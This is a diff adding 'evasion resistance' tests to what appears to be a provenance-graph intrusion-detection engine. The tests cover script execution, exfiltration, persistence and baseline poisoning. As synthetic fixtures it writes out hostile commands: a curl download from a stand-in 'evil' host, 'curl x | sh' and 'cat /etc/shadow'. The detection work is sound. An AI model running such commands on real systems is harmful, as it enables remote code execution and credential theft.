@@ -325,6 +325,108 @@ else:
     check(I["shadow"] in rw_ and I["client"] in rw_ and I["shadow"] not in rf_ and I["client"] not in rf_,
           "corroboration_scope=forward: only what the alerted process affected, not what flowed into it")
 
+# ---------------------------------------------------------------- 0.6: evasion resistance
+import pdp_engine.layers as LY
+from pdp_engine.layers import LayerConfig, is_local, program_key
+check(program_key("/tmp/fedcba9876543210") == "/tmp/{id}" and program_key("/tmp/fedcba9876543210", True) == "/tmp/fedcba9876543210",
+      "strict program key: a file named like a hex id keeps its name (it used to match any hex-named baseline program)")
+check(program_key("/tmp/LS", True) == "/tmp/LS" and program_key("/tmp/LS") == "/tmp/ls", "strict program key: POSIX paths keep their case")
+check(program_key("/Device/HarddiskVolume1/Windows/System32/PING.EXE", True) == "/windows/system32/ping.exe"
+      and program_key("C:\\Users\\a\\AppData\\Local\\Temp\\{12345678-1234-1234-1234-123456789ABC}\\DismHost.exe", True) == "/users/a/appdata/local/temp/{id}/dismhost.exe",
+      "strict program key: Windows programs still case-folded, GUID directories still collapsed")
+nk = NoveltyLayer({"/tmp/0123456789abcdef"}, normalize=True, strict_keys=True)
+check(not nk.is_known("/tmp/fedcba9876543210") and NoveltyLayer({"/tmp/0123456789abcdef"}, normalize=True).is_known("/tmp/fedcba9876543210"),
+      "strict keys: another hex-named binary in the same directory is a new program")
+check(is_local("1.2.3.4%x") and not is_local("1.2.3.4%x", strict=True) and not is_local("[2001:db8::1]", strict=True)
+      and is_local("NA", strict=True) and is_local("fe80::1%eth0", strict=True), "strict addresses: zone ids / brackets no longer make an address local")
+
+r6 = Registry(); J = {}
+for name, e in [("dl", Entity.process("p:dl", "/usr/bin/curl", "curl -o /tmp/x.py http://evil")), ("c2", Entity.socket("n:c2", "203.0.113.9", 443)),
+                ("script", Entity.file("f:script", "/tmp/x.py")), ("py", Entity.process("p:py", "/usr/bin/python3", "python3 -u /tmp/x.py")),
+                ("pyc", Entity.process("p:pyc", "/usr/bin/python3", "python3 -c print(1)")), ("pyf", Entity.file("f:py", "/usr/bin/python3")),
+                ("shadow", Entity.file("f:sh6", "/etc/shadow")), ("cat", Entity.process("p:cat6", "/bin/cat", "cat /etc/shadow")),
+                ("bashrc", Entity.file("f:rc6", "/home/u/.bashrc")), ("cron", Entity.file("f:cron6", "/etc/cron.d/job")),
+                ("other", Entity.file("f:oth6", "/home/u/notes.txt"))]:
+    J[name] = r6.add(e)
+
+
+def eng6(**kw):
+    return TagEngine(TagParams(), set(), {}, 0, **kw)
+
+
+dl_edges = [(J["c2"], "READ", J["dl"], 1), (J["dl"], "WRITE", J["script"], 2), (J["pyf"], "EXECUTE", J["py"], 3), (J["script"], "READ", J["py"], 4),
+            (J["py"], "CONNECT", J["c2"], 5)]
+h_off = {x.rule for x in eng6().process(win(dl_edges), r6)}
+h_on = eng6(script_exec=True, socket_io=True).process(win(dl_edges), r6)
+check("untrusted_exec" not in h_off and "untrusted_code_network" not in h_off,
+      f"before 0.6: a downloaded script run by a known interpreter raises no alarm ({sorted(h_off)})")
+check({x.rule for x in h_on} >= {"untrusted_exec", "untrusted_code_network"} and any(x.key == "/tmp/x.py" for x in h_on if x.rule == "untrusted_exec"),
+      f"script_exec + socket_io: download over a socket read, run by python3 -> untrusted_exec on the script, then C2 ({sorted({x.rule for x in h_on})})")
+h_c = eng6(script_exec=True).process(win([(J["script"], "READ", J["pyc"], 1)]), r6)
+check(h_c == [], "script_exec: inline code (python3 -c) has no script; reading a file is just a read")
+for lab, want in [("python3 -m http.server", ""), ("bash -c 'curl x | sh'", ""), ("python3 -u /tmp/a.py arg", "/tmp/a.py"),
+                  ("powershell.exe -ExecutionPolicy Bypass -File C:\\x\\a.ps1", "C:\\x\\a.ps1"), ("cscript //nologo run.vbs", "run.vbs"),
+                  ("java -cp lib -jar /opt/app.jar", "/opt/app.jar"), ("perl -I lib script.pl", "script.pl")]:
+    rr = Registry(); exe = "/usr/bin/" + lab.split()[0]
+    n = rr.add(Entity.process("p:" + lab, exe, lab))
+    got = eng6(script_exec=True)._script_of(rr, n)
+    check(got == want, f"script argument of '{lab}': {got!r}")
+check(TagEngine._same_file("/home/u/run.vbs", "run.vbs") and TagEngine._same_file("/tmp/a.py", "./a.py") and not TagEngine._same_file("/tmp/b.py", "a.py"),
+      "script path matching: relative script names match the opened file's tail")
+
+ex_edges = [(J["shadow"], "READ", J["cat"], 1), (J["cat"], "WRITE", J["c2"], 2)]
+check(not any(x.rule == "exfiltration" for x in eng6().process(win(ex_edges), r6))
+      and any(x.rule == "exfiltration" for x in eng6(socket_io=True).process(win(ex_edges), r6)),
+      "socket_io: write() on a connected socket after reading /etc/shadow is exfiltration")
+pe = [(J["c2"], "RECVFROM", J["dl"], 1), (J["dl"], "WRITE", J["bashrc"], 2), (J["dl"], "WRITE", J["cron"], 3), (J["dl"], "WRITE", J["other"], 4)]
+hp = [x for x in eng6(persistence=True).process(win(pe), r6) if x.rule == "untrusted_persistence"]
+check([x.nodes[1] for x in hp] == [J["bashrc"]] and not any(x.rule == "untrusted_persistence" for x in eng6().process(win(pe), r6)),
+      "persistence: a process holding untrusted data writing .bashrc alarms (once per process, like every rule)")
+hp2 = [x for x in eng6(persistence=True).process(win([(J["c2"], "RECVFROM", J["dl"], 1), (J["dl"], "WRITE", J["other"], 2), (J["dl"], "WRITE", J["cron"], 3)]), r6)
+       if x.rule == "untrusted_persistence"]
+check([x.nodes[1] for x in hp2] == [J["cron"]] and hp2[0].key == "/usr/bin/curl @ /etc/cron.d", f"persistence: cron.d, key program @ directory ({[x.key for x in hp2]})")
+# live collectors: connect() is traced, read() on the socket is not - the download must still taint
+cr = [(J["dl"], "CONNECT", J["c2"], 1), (J["dl"], "WRITE", J["script"], 2), (J["script"], "EXECUTE", J["py"], 3)]
+check(not any(x.rule == "untrusted_exec" for x in eng6().process(win(cr), r6))
+      and any(x.rule == "untrusted_exec" for x in eng6(connect_receives=True).process(win(cr), r6)),
+      "connect_receives: a file written after connecting to an untrusted address is untrusted content (download via read())")
+le = [(J["cat"], "CONNECT", J["c2"], 1), (J["shadow"], "READ", J["cat"], 2)]
+check(not any(x.rule == "exfiltration" for x in eng6().process(win(le), r6))
+      and [x.nodes for x in eng6(late_exfil=True).process(win(le), r6) if x.rule == "exfiltration"] == [(J["cat"], J["c2"])],
+      "late_exfil: connect first, then read /etc/shadow -> exfiltration (the order no longer hides it)")
+old_cap = LY.UNTRUSTED_FILES_CAP; LY.UNTRUSTED_FILES_CAP = 2
+tc = eng6(image_exec=True)
+rc = Registry(); pc = rc.add(Entity.process("p:w", "/usr/bin/w", "w")); nc = rc.add(Entity.socket("n:x", "203.0.113.1", 1))
+fs = [rc.add(Entity.file(f"f:{k}", f"/tmp/f{k}")) for k in range(5)]
+tc.process(win([(nc, "RECVFROM", pc, 0)] + [(pc, "WRITE", f, k + 1) for k, f in enumerate(fs)]), rc)
+check(len(tc._untrusted_files) == 2 and "/tmp/f4" in tc._untrusted_files, "image_exec memory is bounded (oldest untrusted files forgotten first)")
+LY.UNTRUSTED_FILES_CAP = old_cap
+
+# benign keys relaxed only when they recur; exclusions from unreleased alerts; runtime trust = recurring addresses
+days6 = {"d1": [win([(I["oneoff"], "RECVFROM", I["nginx"]), (I["nginx"], "CLONE", I["worker"]), (I["sh_file"], "EXECUTE", I["worker"])])],
+         "d2": [win([(I["client"], "RECVFROM", I["nginx"])])], "d3": [win([(I["client"], "RECVFROM", I["worker"])])]}
+c6 = LayerConfig(relax_min_days=2, recurring_trust=True)
+sp0 = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, c6, log=lambda m: None)
+check("/usr/sbin/nginx -> /bin/sh" in sp0["thresholds"].get("tainted_spawn", {}) and set(sp0["trusted_ips"]) == {"10.0.0.5", "198.51.100.7"},
+      "first fit (no previous model): one-day keys relax and every baseline address is trusted, as before 0.6")
+sp1 = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, c6, log=lambda m: None, prior={"thresholds": {}, "trusted_ips": []})
+check("/usr/sbin/nginx -> /bin/sh" not in sp1["thresholds"].get("tainted_spawn", {}),
+      "retrain, relax_min_days=2: a key new since the previous model that fired on one day only stays strict (one poisoned day is not enough)")
+check(sp1["trusted_ips"] == ["10.0.0.5"], f"retrain, recurring_trust: a new address seen on one day is not trusted ({sp1['trusted_ips']})")
+sp1b = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, c6, log=lambda m: None,
+                  prior={"thresholds": {"tainted_spawn": {"/usr/sbin/nginx -> /bin/sh": 0.1}}, "trusted_ips": ["198.51.100.7"]})
+check("/usr/sbin/nginx -> /bin/sh" in sp1b["thresholds"].get("tainted_spawn", {}) and "198.51.100.7" in sp1b["trusted_ips"],
+      "retrain: what the previous model already accepted stays accepted")
+sp2 = fit_layers(Store(days6), ["d1", "d2", "d3"], reg, N_PRE, LayerConfig(),
+                 exclude={"programs": ["/usr/sbin/nginx"], "addresses": ["198.51.100.7"], "rule_keys": [["tainted_spawn", "/usr/sbin/nginx -> /bin/sh"]]},
+                 log=lambda m: None)
+check(sp2["known_executables"] == [] and "198.51.100.7" not in sp2["trusted_ips"]
+      and "/usr/sbin/nginx -> /bin/sh" not in sp2["thresholds"].get("tainted_spawn", {}) and sp2["excluded"] == {"programs": 1, "addresses": 1, "rule_keys": 1},
+      f"exclude: what unreleased alerts point at does not become known / trusted / relaxed ({sp2.get('excluded')})")
+from pdp_engine.scoring import fill_missing
+fm = fill_missing(np.array([np.inf, -np.inf, np.nan, 2.0], dtype=np.float32))
+check(fm[0] > 1e5 and fm[1] == 0 and fm[2] == 0 and fm[3] == 2, "fill_missing: an overflowing score ranks first, not last")
+
 # ---------------------------------------------------------------- detector-1 structural input
 try:
     import torch
